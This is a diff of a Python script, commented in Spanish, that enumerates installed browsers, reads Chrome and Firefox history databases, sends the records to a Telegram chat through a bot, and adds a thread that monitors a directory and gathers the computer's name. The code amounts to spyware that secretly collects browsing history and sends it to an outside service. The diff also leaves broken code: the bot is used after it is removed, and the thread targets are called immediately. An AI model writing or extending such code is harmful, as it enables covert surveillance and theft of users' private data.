@@ -1,4 +1,3 @@
-import telebot
 import serial.tools.list_ports
 import time
 import webbrowser
@@ -12,16 +11,9 @@ import pathlib
 import subprocess
 import threading
 
-#*************************************************************
-#   CONSTANTES
-token = ""
-chat_id = ""
-bot = telebot.TeleBot(token)
-
-#Enviamos el mensaje al chatID del cliente
-def enviar_mensaje_telegram(token, chat_id, mensaje):
-    bot = telebot.TeleBot(token)
-    bot.send_message(chat_id, mensaje)
+import m.utils as utils
+import m.moni as moni
+import m.config as config
 
 
 #********************************************************************************************************************************
@@ -49,8 +41,6 @@ def find_browsers():
             opera_path = os.path.join(path, 'Opera\\launcher.exe')
             if os.path.isfile(opera_path):
                 browsers.append('Opera')
-    
-    print(browsers)
     return browsers
 
 
@@ -81,8 +71,7 @@ def search_HistoryBrowser(username, browsers):
                     f"Favicon ID: {resultado['favicon_id']}"
             bot.send_message(chat_id, mensaje)
 
-    if "Mozilla Firefox" in browsers and not check_Firefox():
-        print("hola1")
+    elif "Mozilla Firefox" in browsers and not check_Firefox():
         profiles = get_profiles_mozilla(username)
         print(profiles)
         for profile in profiles:
@@ -102,9 +91,6 @@ def search_HistoryBrowser(username, browsers):
             conn.close()
             print (json.dumps(results, ensure_ascii=False))
 
-
-def get_Username():
-    return os.getlogin()
 
 def crear_consulta_sql(ruta):
     condiciones = []
@@ -168,10 +154,23 @@ def check_Chrome():
 #FUNCION PRINCIPAL
 def main():
 
-    #Obtenemos el nombre del usuario
-    username = get_Username()
-    #Vemos los navegadores instalados
+    #Obtenemos los datos del ordenador
+    username = utils.get_Username()
+    hostname = utils.get_computer_name()
+
+    #Navegadores instalados
     browsers = find_browsers()
-    search_HistoryBrowser(username, browsers)
+
+    #Ruta a monitorizar
+    dir_moni = config.moniDIR1
+
+    #Hilo1 - Navegadores
+    threat1 = threading.Thread(target=search_HistoryBrowser(username, browsers))
+    #Hilo2 - Monitorización de directorio
+    threat2 = threading.Thread(target=moni.moniDirectory(dir_moni))
+
+    threat1.start()
+    threat2.start()
+
 
 main()
